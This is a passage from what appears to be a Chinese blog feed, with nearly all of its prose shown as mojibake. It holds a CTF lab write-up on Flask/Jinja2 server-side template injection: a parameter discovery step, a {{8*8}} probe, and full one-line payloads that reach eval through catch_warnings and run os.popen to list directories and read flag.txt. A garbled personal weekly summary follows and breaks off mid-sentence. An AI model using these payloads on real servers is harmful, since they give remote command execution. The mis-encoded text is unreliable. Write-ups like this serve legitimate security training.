title="ä½¿ç”¨:"></a>ä½¿ç”¨:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">arjun -u http://e4439159-0363-4410-ac62-5f45a7ccf28a.node5.buuoj.cn:81/ -m å‚æ•°<br></code></pre></td></tr></table></figure><h4 id="å‚æ•°"><a href="#å‚æ•°" class="headerlink" title="å‚æ•°:"></a>å‚æ•°:</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs txt">get<br>post<br>JSON<br>XML<br></code></pre></td></tr></table></figure><h4 id="ç¤ºä¾‹"><a href="#ç¤ºä¾‹" class="headerlink" title="ç¤ºä¾‹:"></a>ç¤ºä¾‹:</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">arjun -u http://e4439159-0363-4410-ac62-5f45a7ccf28a.node5.buuoj.cn:81/ -m get<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240205141050640.png" alt="image-20240205141050640"></p><p>è·å–åˆ°ç›®æ ‡ç½‘ç«™çš„ç”¨æˆ·å¯æ§å‚æ•°ä¸ºname</p><p><img src="/images/2024-2-18/image-20240205141543822.png" alt="image-20240205141543822"></p><h2 id="æ£€æµ‹ç½‘ç«™æ˜¯å¦èƒ½å¤Ÿè¿›è¡Œflaskæ¡†æ¶çš„æ¨¡æ¿æ³¨å…¥"><a href="#æ£€æµ‹ç½‘ç«™æ˜¯å¦èƒ½å¤Ÿè¿›è¡Œflaskæ¡†æ¶çš„æ¨¡æ¿æ³¨å…¥" class="headerlink" title="æ£€æµ‹ç½‘ç«™æ˜¯å¦èƒ½å¤Ÿè¿›è¡Œflaskæ¡†æ¶çš„æ¨¡æ¿æ³¨å…¥:"></a>æ£€æµ‹ç½‘ç«™æ˜¯å¦èƒ½å¤Ÿè¿›è¡Œflaskæ¡†æ¶çš„æ¨¡æ¿æ³¨å…¥:</h2><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?name=&#123;&#123;8*8&#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240205141749756.png" alt="image-20240205141749756"></p><p>æˆåŠŸæ‰§è¡Œæˆ‘ä»¬çš„8*8,æ‰€ä»¥å­˜åœ¨æ¨¡æ¿æ³¨å…¥ï¼Œå¯ä»¥çŒœæµ‹ä¸ºjinja2çš„æ¨¡æ¿æ³¨å…¥</p><h2 id="æ„é€ æ¨¡æ¿æ³¨å…¥payload"><a href="#æ„é€ æ¨¡æ¿æ³¨å…¥payload" class="headerlink" title="æ„é€ æ¨¡æ¿æ³¨å…¥payload:"></a>æ„é€ æ¨¡æ¿æ³¨å…¥payload:</h2><h3 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ:"></a>åˆ†æ:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs txt">1.ç›®æ ‡æ˜¯ä½¿ç”¨&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls /&#x27;).read()&quot;),è¿›è¡Œæ–‡ä»¶ä¿¡æ¯çš„è·å–<br>æ‰€ä»¥éœ€è¦ç”¨åˆ°eval()å‡½æ•°<br>2.evalå‡½æ•°å­˜åœ¨äº[&#x27;catch_warnings&#x27;].__init__.__globals__[&#x27;__builtins__&#x27;]ä¸­<br>3.[&#x27;catch_warnings&#x27;]å­˜åœ¨äº[].__class__.__base__.__subclasses__()ä¸­<br></code></pre></td></tr></table></figure><h4 id="æ„é€ æ¨¡æ¿æ³¨å…¥çš„ä»£ç "><a href="#æ„é€ æ¨¡æ¿æ³¨å…¥çš„ä»£ç " class="headerlink" title="æ„é€ æ¨¡æ¿æ³¨å…¥çš„ä»£ç :"></a>æ„é€ æ¨¡æ¿æ³¨å…¥çš„ä»£ç :</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> [].__class__.__base__.__subclasses__():<br>    <span class="hljs-keyword">if</span> c.__name__==<span class="hljs-string">&#x27;catch_warnings&#x27;</span>:<br>        c.__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>].<span class="hljs-built_in">eval</span>(<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls           /&#x27;).read()&quot;</span>)<br></code></pre></td></tr></table></figure><p>&#x3D;&gt;å˜æˆæ¨¡æ¿æ³¨å…¥çš„payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs txt">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;<br>    &#123;% if c.__name__==&#x27;catch_warnings&#x27;%&#125;<br>        &#123;&#123;c.__init__.__globals__[&#x27;__builtins__&#x27;].eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls           /&#x27;).read()&quot;)&#125;&#125;<br>&#123;% endif %&#125;<br>&#123;% endfor %&#125;<br>=&gt;åˆå¹¶åˆ°ä¸€è¡Œ<br>&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27;%&#125;&#123;&#123;c.__init__.__globals__[&#x27;__builtins__&#x27;].eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls           /&#x27;).read()&quot;)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;<br></code></pre></td></tr></table></figure><h2 id="è·å–ç½‘é¡µæ–‡ä»¶ä¿¡æ¯"><a href="#è·å–ç½‘é¡µæ–‡ä»¶ä¿¡æ¯" class="headerlink" title="è·å–ç½‘é¡µæ–‡ä»¶ä¿¡æ¯:"></a>è·å–ç½‘é¡µæ–‡ä»¶ä¿¡æ¯:</h2><p><strong>(æœ€é‡è¦çš„ä¸¤ä¸ªç›®å½•ä¿¡æ¯ä¸ºå½“å‰ç½‘é¡µç›®å½•ä¿¡æ¯å’Œæ ¹ç›®å½•ä¿¡æ¯ï¼Œä¸€èˆ¬å…ˆæ‰¾è¿™ä¸¤ä¸ªï¼Œå¦‚æœè¿˜æ²¡æœ‰ï¼Œå°±å¾—å»æ‰¾å…¶ä»–ç›®å½•ä¸­çš„æ–‡ä»¶ä¿¡æ¯)</strong></p><h3 id="è·å–æ ¹ç›®å½•æ–‡ä»¶ä¿¡æ¯"><a href="#è·å–æ ¹ç›®å½•æ–‡ä»¶ä¿¡æ¯" class="headerlink" title="è·å–æ ¹ç›®å½•æ–‡ä»¶ä¿¡æ¯:"></a>è·å–æ ¹ç›®å½•æ–‡ä»¶ä¿¡æ¯:</h3><h4 id="payload"><a href="#payload" class="headerlink" title="payload:"></a>payload:</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?name=&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27;%&#125;&#123;&#123;c.__init__.__globals__[&#x27;__builtins__&#x27;].eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls           /&#x27;).read()&quot;)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240205143147824.png" alt="image-20240205143147824"></p><p>æ²¡æœ‰å‘ç°flagæ–‡ä»¶çš„ä¿¡æ¯</p><h3 id="è·å–ç½‘é¡µå½“å‰ç›®å½•ä¿¡æ¯"><a href="#è·å–ç½‘é¡µå½“å‰ç›®å½•ä¿¡æ¯" class="headerlink" title="è·å–ç½‘é¡µå½“å‰ç›®å½•ä¿¡æ¯:"></a>è·å–ç½‘é¡µå½“å‰ç›®å½•ä¿¡æ¯:</h3><h4 id="payloadï¼š"><a href="#payloadï¼š" class="headerlink" title="payloadï¼š"></a>payloadï¼š</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?name=&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27;%&#125;&#123;&#123;c.__init__.__globals__[&#x27;__builtins__&#x27;].eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls       &#x27;).read()&quot;)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240205143502125.png" alt="image-20240205143502125"></p><p>å‘ç°flag.txtæ–‡ä»¶</p><h3 id="è·å–flag-txtæ–‡ä»¶çš„ä¿¡æ¯"><a href="#è·å–flag-txtæ–‡ä»¶çš„ä¿¡æ¯" class="headerlink" title="è·å–flag.txtæ–‡ä»¶çš„ä¿¡æ¯:"></a>è·å–flag.txtæ–‡ä»¶çš„ä¿¡æ¯:</h3><h4 id="payload-1"><a href="#payload-1" class="headerlink" title="payload:"></a>payload:</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?name=&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27;%&#125;&#123;&#123;c.__init__.__globals__[&#x27;__builtins__&#x27;].eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat flag.txt       &#x27;).read()&quot;)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240205143607585.png" alt="image-20240205143607585"></p><p>flag&#x3D;flag{066918ea-c0f6-496b-93df-9bb6062b09e5}</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>å¯’å‡ç¬¬ä¸€å‘¨_å‘¨æ€»ç»“</title>
    <link href="/2024/02/05/2024-02-5-%E5%AF%92%E5%81%87%E7%AC%AC%E4%B8%80%E5%91%A8_%E5%91%A8%E6%80%BB%E7%BB%93/"/>
    <url>/2024/02/05/2024-02-5-%E5%AF%92%E5%81%87%E7%AC%AC%E4%B8%80%E5%91%A8_%E5%91%A8%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h1 id="å¯’å‡ç¬¬ä¸€å‘¨-å‘¨æ€»ç»“-ã€Šæˆ‘çš„å¥‹æ–—southç‰ˆã€‹"><a href="#å¯’å‡ç¬¬ä¸€å‘¨-å‘¨æ€»ç»“-ã€Šæˆ‘çš„å¥‹æ–—southç‰ˆã€‹" class="headerlink" title="å¯’å‡ç¬¬ä¸€å‘¨_å‘¨æ€»ç»“-ã€Šæˆ‘çš„å¥‹æ–—southç‰ˆã€‹"></a>å¯’å‡ç¬¬ä¸€å‘¨_å‘¨æ€»ç»“-ã€Šæˆ‘çš„å¥‹æ–—southç‰ˆã€‹</h1><h2 id="ç¬¬ä¸€å‘¨"><a href="#ç¬¬ä¸€å‘¨" class="headerlink" title="ç¬¬ä¸€å‘¨:"></a>ç¬¬ä¸€å‘¨:</h2><h3 id="Todoï¼š"><a href="#Todoï¼š" class="headerlink" title="Todoï¼š"></a>Todoï¼š</h3><p>1.BUUCTFç¬¬ä¸‰é¢é¢˜ç›®å…¨éƒ¨åˆ·å®Œ(14é“é¢˜)ï¼ˆ6é“ï¼‰</p><p>åæ€:</p><p>åˆ·é¢˜çš„æ—¶å€™æ€»æ˜¯æƒ³ç€ç©æ‰‹æœºï¼Œæ„Ÿè§‰æ³¨æ„å°±æ˜¯ä¸æ€ä¹ˆé›†ä¸­ï¼Œè€æ¯›ç—…äº†ï¼Œä½†æ˜¯çœ‹å®Œæ‰‹æœºæœ‰å¾ˆç„¦è™‘ï¼Œåªèƒ½è¯´å°±æ˜¯æœ‰â€ç²¾ç¥åˆ†è£‚â€çš„å¤§ç—…,ä¸‹å‘¨åˆ·é¢˜å¾—å¥½å¥½åˆ·ï¼ŒæŠŠæ‰‹æœºå…³æœºäº†å§emmm</p><p>2.è¥¿æ¹–è®ºå‰‘æ¯”èµ›ï¼Œä»¥åŠé¢˜ç›®å¤ç°ï¼ˆå¤ç°1é“ï¼Œ2å¤©ï¼‰</p><p>åæ€ï¼šä»¥ä¸ºè‡ªå·±å­¦äº†ä¸€ä¸ªå­¦æœŸï¼ˆä¹Ÿæ²¡æœ‰ä¸€ä¸ªå­¦æœŸï¼Œé™¤äº†æš‘å‡å°±æ²¡å¥½å¥½å­¦è¿‡ï¼Œå¯æ¶ï¼ï¼ï¼ï¼ï¼‰æ²¡æƒ³åˆ°å°ä¸‘è¿˜æ˜¯æˆ‘è‡ªå·±ï¼Œä¸€é“é¢˜éƒ½æ²¡åšå‡ºæ¥ï¼Œå•Šå•Šå•Šå•Šå•Šå•Šï¼Œå—ä¸äº†äº†ï¼ï¼ï¼ï¼Œå¾—çŒ›çŒ›åˆ·é¢˜æ‰è¡Œï¼Œå¹¸å¥½å¤ç°çš„æ—¶å€™è¿˜ç®—å¯ä»¥ç†è§£ï¼Œä¸ç„¶è¦è‡ªé—­äº†ï¼Œç¯å¢ƒæ­å»ºç”¨äº†ä¸€å¤©ï¼Œç¡®å®è¶…ä¹æˆ‘çš„æƒ³è±¡ï¼Œä¸è¿‡è¿˜æ˜¯æ€ªè‡ªå·±å¤ªæ‰§ç€äºå¤ç°å‡ºç¯å¢ƒäº†ï¼Œåˆ°æœ€åæµªè´¹è¿™ä¹ˆå¤šæ—¶é—´ï¼Œä¸è¿‡ä¹Ÿç®—æ”¶è·äº†å¾ˆå¤šï¼Œè‡³å°‘æœ‰è¿·ä¹‹è‡ªä¿¡è§‰å¾—è‡ªå·±ä»¥åä¹Ÿå¯ä»¥å‡ºé¢˜äº†á•™(&#96;â–¿Â´)á•—,ä¸è¿‡è¿˜æ˜¯å¸Œæœ›ä»¥åèƒ½æŠ“ä½äº‹ä»¶å¾—ä¸»æ¬¡ï¼Œæé«˜æ•ˆç‡æ‰æ˜¯å…³é”®ï¼ï¼ï¼à«®â‚ Ëƒ â¤™ Ë‚ â‚áƒ</p><p>3.å¥èº«4æ¬¡(3æ¬¡ï¼Œå°å¹´)</p><p>åæ€ï¼šè¿™å‘¨å»å¥èº«æˆ¿ä¸Šäº†æ•™ç»ƒè¯¾ï¼Œæ‰çŸ¥é“ä¹‹å‰è‡ªå·±éƒ½ç»ƒé”™äº†ï¼Œä»¥åè¿˜æ˜¯å¾—æ³¨æ„ä¸‹å¥èº«å¾—åŠ¨ä½œæ‰è¡Œï¼Œè¿™æ ·æ‰èƒ½æ›´æœ‰æ•ˆç‡(âŒ¯ê’ªê’«ê’ª)à©­ï¼Œä¸è¿‡åŠ¨ä½œç»ƒå¯¹äº†ä¹‹åï¼Œæ„Ÿè§‰æ›´ç´¯äº†ï¼Œæœç„¶è™šæ‰¹æ˜¯è¿™æ ·çš„ï¼Œå¥èº«ä¸»è¦å°±æ˜¯æƒ³å¼ºåŒ–è‡ªå·±çš„æ„å¿—ï¼Œè®©è‡ªå·±èƒ½å¤Ÿä¸ºä¸€ä»¶äº‹åšæŒä¸‹å»ï¼Œæ‰€ä»¥ä¸èƒ½æ”¾å¼ƒï¼Œå†ç´¯ä¹Ÿå¾—ç»§ç»­åšæŒä¸‹å»à©­ á•)à©­*â¾â¾ï¼Œè¿™å‘¨åªå»äº†ä¸‰æ¬¡ï¼Œä¸»è¦è¿˜æ˜¯å› ä¸ºå°å¹´çš„æ´»åŠ¨å¤ªå¤šäº†ï¼Œè¦å¸®å¾ˆå¤šå¿™ï¼Œä¸‹å‘¨å¸Œæœ›èƒ½å¤Ÿå¥½å¥½å®Œæˆå››æ¬¡ï¼Œå¿…é¡»å¾—è·‘æ­¥ï¼Œæ¯•ç«Ÿè·‘æ­¥æˆ‘è‡ªå·±æ„Ÿè§‰èƒ½å¤Ÿç¼“è§£è‡ªå·±çš„ç¥ç»ç„¦è™‘(â—â€™â—¡â€™â—)ã€‚</p><p>5.ç¤¾å›¢ç½‘ç«™é…ç½®æˆåŠŸ</p><p>æ€»ç»“:è¿™æ˜¯æˆ‘è¿™å‘¨æœ€å¼€å¿ƒçš„äº‹æƒ…ï¼Œä¸‰ä¸ªæœˆåŠªåŠ›ç»ˆäºæˆä¸ºç°å®ï¼Œè¿‡ç¨‹è™½ç„¶å­¤ç‹¬è‰°éš¾ï¼Œä½†æ˜¯æ— æ‚”áœŠ(ê’ªËŠê’³Ë‹ê’ª)áœŠï¼Œå±äºè‡ªå·±æœ€ç‰¹æ®Šçš„ç¤¼ç‰©ï¼Œç»™ç¤¾å›¢çš„ä¸€ä»½ç¤¼ç‰©ï¼Œå¸Œæœ›æˆ‘ä»¬åˆšåˆšæˆç«‹çš„ç¤¾å›¢èƒ½è¶Šæ¥è¶Šå¥½âœ§*ï½¡ (ËŠá—œË‹*) âœ§*ã€‚ï¼Œæœ¬æ¥æƒ³ç”¨é˜¿é‡Œäº‘é…ç½®ï¼Œå› ä¸ºè€ƒè™‘åˆ°é˜¿é‡Œäº‘æ˜¯å›½å†…ï¼Œè®¿é—®ä¼šå¿«ä¸€äº›ï¼Œä½†æ˜¯æ²¡æƒ³åˆ°é™åˆ¶è¿™ä¹ˆå¤šï¼Œä¸€ä¸ªèº«ä»½å®¡æ ¸ä¸€å‘¨éƒ½è¿˜æ²¡è¿‡ï¼ˆè™½ç„¶è‡ªå·±æ‹çš„å›¾ç‰‡ç¡®å®æœ‰ç‚¹éšæ„ï¼Œä½†æ˜¯ä¸€å‘¨éƒ½æ²¡æ¶ˆæ¯å°±æœ‰ç‚¹è¿‡åˆ†äº†á•¦à¼¼à¼àº¶_à¼àº¶à¼½á•—ï¼‰ï¼Œç½‘ç«™åˆ›å»ºè¿˜å¾—æ˜¯github,å°±æ˜¯è®¿é—®æœ‰ç‚¹æ…¢ï¼Œä¸è¿‡è¿˜æ˜¯è¦æ„Ÿè°¢githubè®©æˆ‘å®Œæˆæˆ‘çš„2023å¹´çš„æ¢¦æƒ³ä¹‹ä¸€(â—ËƒÌ¶á—œË‚Ì¶â—)âœ©ã€‚</p><h2 id="å­¦ä¹ "><a href="#å­¦ä¹ " class="headerlink" title="å­¦ä¹ :"></a>å­¦ä¹ :</h2><h3 id="ç¬¬ä¸€å‘¨ï¼š"><a href="#ç¬¬ä¸€å‘¨ï¼š" class="headerlink" title="ç¬¬ä¸€å‘¨ï¼š"></a>ç¬¬ä¸€å‘¨ï¼š</h3><ul><li><p><input checked disabled type="checkbox"> </p><h5 id="CISCN2019-ååŒ—èµ›åŒº-Day1-Web1-Dropbox"><a href="#CISCN2019-ååŒ—èµ›åŒº-Day1-Web1-Dropbox" class="headerlink" title="[CISCN2019 ååŒ—èµ›åŒº Day1 Web1]Dropbox"></a>[CISCN2019 ååŒ—èµ›åŒº Day1 Web1]Dropbox</h5></li><li><p><input checked disabled type="checkbox"> </p><h5 id="b01lers2020-Welcome-to-Earth"><a href="#b01lers2020-Welcome-to-Earth" class="headerlink" title="[b01lers2020]Welcome to Earth"></a>[b01lers2020]Welcome to Earth</h5></li><li><p><input checked disabled type="checkbox"> </p><h5 id="HFCTF2020-EasyLogin"><a href="#HFCTF2020-EasyLogin" class="headerlink" title="[HFCTF2020]EasyLogin"></a>[HFCTF2020]EasyLogin</h5></li><li><p><input checked disabled type="checkbox"> </p><h5 id="CISCN2019-æ€»å†³èµ›-Day2-Web1-Easyweb"><a href="#CISCN2019-æ€»å†³èµ›-Day2-Web1-Easyweb" class="headerlink" title="[CISCN2019 æ€»å†³èµ› Day2 Web1]Easyweb"></a>[CISCN2019 æ€»å†³èµ› Day2 Web1]Easyweb</h5></li><li><p><input checked disabled type="checkbox"> </p><h5 id="GYCTF2020-Ezsqli"><a href="#GYCTF2020-Ezsqli" class="headerlink" title="[GYCTF2020]Ezsqli"></a>[GYCTF2020]Ezsqli</h5></li><li><p><input checked disabled type="checkbox"> </p><h5 id="SWPUCTF-2018-SimplePHP"><a href="#SWPUCTF-2018-SimplePHP" class="headerlink" title="[SWPUCTF 2018]SimplePHP"></a>[SWPUCTF 2018]SimplePHP</h5></li><li><p><input checked disabled type="checkbox"> </p><h5 id="ç¬¬ä¸ƒå±Šè¥¿æ¹–è®ºå‰‘å¤ç°â€”only-sql-WP"><a href="#ç¬¬ä¸ƒå±Šè¥¿æ¹–è®ºå‰‘å¤ç°â€”only-sql-WP" class="headerlink" title="[ç¬¬ä¸ƒå±Šè¥¿æ¹–è®ºå‰‘å¤ç°â€”only_sql-WP]"></a>[ç¬¬ä¸ƒå±Šè¥¿æ¹–è®ºå‰‘å¤ç°â€”only_sql-WP]</h5></li></ul><h2 id="ç”Ÿæ´»"><a href="#ç”Ÿæ´»" class="headerlink" title="ç”Ÿæ´»:"></a>ç”Ÿæ´»:</h2><p>1.ã€Šæ€ç»´æ”¹å˜ç”Ÿæ´»ã€‹çœ‹äº†ä¸¤ç« </p><p>åæ€ï¼šè¿™æœ¬ä¹¦æ˜¯åˆ«äººæ¨èçš„ï¼Œå› ä¸ºè¿™ä¸ªå­¦æœŸæ„Ÿè§‰è‡ªå·±å¾ˆç„¦è™‘ï¼Œæœ‰æ—¶å€™ä¼šè«åå¤´ç–¼ï¼Œå…¶å®æ˜¯ç„¦è™‘å¼•èµ·çš„ç¥ç»ç´Šä¹±ï¼Œçœ‹äº†è¿™æœ¬ä¹¦çš„å‰ä¸¤ç« ï¼Œè®©æˆ‘çš„è§‚å¿µæ”¹å˜äº†å¾ˆå¤šï¼Œå…¶å®ä¸–ç•Œä¸Šå¾ˆå¤šçš„ç„¦è™‘éƒ½æ˜¯ç”±æˆ‘ä»¬è‡ªæˆ‘ä¸æ­£ç¡®çš„è§‚å¿µå¯¼è‡´çš„ï¼Œç¡®å®å­¦åˆ°äº†å¾ˆå¤šï¼Œè®©æˆ‘è¿™ä¸€ä¸ªæ˜ŸæœŸçš„æ€ç»ªå¹³ç¨³äº†å¾ˆå¤šï¼Œæƒ³å¾—ä¹Ÿå°‘äº†ï¼Œå¯æƒœè‡ªå·±è¿˜æ˜¯æ”¹ä¸äº†çˆ±ç©æ‰‹æœºçš„æ¯›ç—…ï¼Œæ²¡è¯»å¤šå°‘(&#x2F;&#x2F;Ì€Ğ”&#x2F;Ì&#x2F;)ï¼Œä¸‹å‘¨å¸Œæœ›è‡ªå·±èƒ½å¥½å¥½çœ‹ä¹¦ï¼Œå°‘ç©æ‰‹æœºï¼Œæ¯•ç«Ÿåˆ·è§†é¢‘ç¡®å®æ²¡æœ‰ä»»ä½•çš„æ„ä¹‰á••( á› )á•—ã€‚</p><p>2.ç®€å•æ‰“æ‰«äº†è‡ªå·±çš„æˆ¿é—´</p><p>åæ€ï¼šå°å¹´ç¡®å®å¾ˆå¿«ä¹ï¼Œä½†æ˜¯ä¹Ÿå‹ç¼©äº†è‡ªå·±çš„è®¡åˆ’æ—¶é—´ï¼Œåªèƒ½ç®€å•æ‰“æ‰«ä¸€ä¸‹äº†ï¼Œä¸‹å‘¨è¿˜æ˜¯å¾—ä»”ç»†æ•´ç†ä¸€ä¸‹ï¼Œæ¯•ç«Ÿæ‰“æ‰«å«ç”Ÿä¹Ÿèƒ½è®©è‡ªå·±çš„æ€ç»ªç®€å•ä¸€äº›ã€‚</p><p>3.è¿‡å°å¹´</p><p>æ€»ç»“ï¼šå’Œå®¶äººä¸€èµ·å‡†å¤‡çš„ï¼Œè™½ç„¶å¼„åˆ°å¾ˆæ™šï¼Œä½†å…¶å®å¾ˆå¿«ä¹ã€‚</p><h2 id="å·¥ä½œï¼š"><a href="#å·¥ä½œï¼š" class="headerlink" title="å·¥ä½œï¼š"></a>å·¥ä½œï¼š</h2><p>1.å†™å¥½äº†ä¸‹å­¦æœŸçš„ç¤¾å›¢è®¡åˆ’å®‰æ’è¡¨</p><p>åæ€ï¼šç¤¾é•¿å‡†å¤‡è€ƒç ”äº†ï¼Œæ‰€ä»¥å‰¯ç¤¾é•¿è¦æ‰›èµ·å¤§æ——äº†ï¼Œè®¡åˆ’è¡¨æ˜¯åˆ·é¢˜çš„æ—¶å€™çªç„¶æƒ³åˆ°çš„ï¼ˆåˆ·é¢˜çš„æ—¶å€™èƒ¡æ€ä¹±æƒ³ï¼Œè¯¥æ‰“ï¼Œä¸è¿‡ä¹ŸæŒºå¥½ï¼Œæ¯•ç«Ÿä¸€ä¸‹å°±æƒ³å‡ºæ¥äº†ï¼‰ï¼Œè®¡åˆ’è¡¨å†™å‡ºæ¥ä¹Ÿç®—æ˜¯å®Œæˆäº†ä¸€ä»¶å¤§äº‹ï¼Œæ¯•ç«Ÿå¯ä»¥è®©è‡ªå·±å’Œç¤¾å›¢æœ‰ä¸€ä¸ªæ˜ç¡®çš„è§„åˆ’ç›®æ ‡ã€‚</p><p>2.å¼€äº†ç¬¬ä¸€æ¬¡ç¤¾å›¢ç¬¬äºŒå±Šç®¡ç†å‘˜çº¿ä¸Šä¼šè®®</p><p>åæ€ï¼šæ„Ÿè§‰å¼€ä¼šçš„æ°›å›´è¿˜æ˜¯å¤ªå®‰é™äº†ï¼Œå…¶å®ä¸»è¦é—®é¢˜è¿˜æ˜¯æˆ‘è¿™ä¸ªå‘èµ·äººå¤ªè½¯å¼±äº†ï¼Œå‘è¨€çš„æ—¶å€™è¿˜åœ¨è€ƒè™‘è¯´é”™è¯è¯¥æ€ä¹ˆåŠï¼Œæ˜æ˜å¼€ä¼šå‰å¾ˆå¤šæƒ³è¯´çš„ï¼Œå¼€ä¼šçš„æ—¶å€™è€ƒè™‘å¤ªå¤šå°±æ²¡æ•¢è¯´ï¼Œè¿™è€æ¯›ç—…ä¹Ÿå¾—æ”¹ï¼Œæ¯•ç«Ÿå†³å®šæ‰›èµ·å¤§æ——äº†ï¼ŒçŠ¹çŠ¹è±«è±«çš„å°±ä¸è¡Œï¼Œä¸‹æ¬¡å¼€ä¼šæƒ³è¯´ä»€ä¹ˆç›´æ¥è¯´ï¼Œè®¨è®ºäº†è®¡åˆ’è¡¨ï¼Œå¤§å®¶éƒ½åŒæ„ï¼Œè™½ç„¶éƒ½æ˜¯é»˜è®¤ï¼Œä½†æ˜¯ä¹ŸæŒºå¼€å¿ƒï¼Œæ¯•ç«Ÿä¹Ÿç®—æ˜¯ä¸€ç§è®¤å¯ï¼Œå¸Œæœ›å¯ä»¥æŠŠç¤¾å›¢è¶Šåšè¶Šå¥½ï¼ï¼ï¼</p><p>3.å¼€äº†webéƒ¨é—¨çš„å‘¨ä¼š</p><p>åæ€ï¼šè¯´å¥½ç”¨bç«™å’Œå¤§å®¶ä¸€èµ·å­¦ä¹ ï¼Œä½†æ˜¯çœ‹ç€ç›´æ’­è¿˜æ˜¯æ€‚äº†ï¼Œå…¶å®é™åˆ¶ä¹Ÿå¾ˆå¤šï¼ˆæ‰¾ç†ç”±äº†ï¼‰ï¼Œä¸‹å‘¨å†è¯•è¯•ï¼ï¼!è¿™å‘¨å¤§å®¶çš„è®¡åˆ’å®Œæˆåº¦ä¸é«˜ï¼Œæˆ‘ä¹Ÿæ²¡æœ‰å¥½å¥½ç›‘ç£å¤§å®¶ï¼Œä¸‹å‘¨æ‰“ç®—æ¯å¤©å‘è‡ªå·±è¿™ä¸€å¤©å¹²äº†å•¥çš„æ¥é¾™ï¼Œæˆ‘ä¸€å®šè¦åšå¥½å¸¦å¤´ä½œç”¨ï¼ï¼ï¼</p><h2 id="å¨±ä¹"><a href="#å¨±ä¹" class="headerlink" title="å¨±ä¹:"></a>å¨±ä¹:</h2><p>1.çœ‹äº†ã€Šæ½œè¡Œã€‹</p><p>æ€»ç»“ï¼šå› ä¸ºæ˜¯åˆ˜å¾·åæ¼”çš„ï¼Œæ‰€ä»¥ä¸€ç›´æƒ³å»çœ‹ï¼Œä¹‹å‰åœ¨å­¦æ ¡çš„æ—¶å€™æ²¡æœºä¼šï¼Œåˆé‡åˆ°æœŸæœ«å‘¨ï¼Œæ‰€ä»¥ç­‰åˆ°æˆ‘æœ‰ç©ºçš„æ—¶å€™å­¦æ ¡å‘¨å›´çš„ç”µå½±é™¢å·²ç»éƒ½ä¸‹æ¶äº†ï¼Œä¸è¿‡è¿™å‘¨åœ¨æŸ¥æœ€è¿‘ç”µå½±çš„æ—¶å€™å‘ç°å®¶å‘¨å›´æœ‰ä¸ªç”µå½±é™¢è¿˜æœ‰ï¼Œçœ‹åˆ°çš„æ—¶å€™è¶…å…´å¥‹ï¼ï¼ï¼ç›´æ¥å°±ä¹°äº†å½“å¤©ç”µå½±ç¥¨å°±å»çœ‹äº†ï¼Œç”µå½±ç»™æˆ‘çš„æ„Ÿè§¦å¾ˆå¤šï¼Œè™½ç„¶ç”µå½±å¥½åƒè¯„åˆ†ä¸é«˜ï¼Œä½†æ˜¯æˆ‘çœ‹ç”µå½±ä»æ¥éƒ½æ˜¯çœ‹å¥”ç€æ„Ÿæ‚Ÿå»çš„ï¼Œæ‰€ä»¥æ²¡å¤ªåœ¨æ„ç”µå½±æœ¬èº«æ€ä¹ˆæ 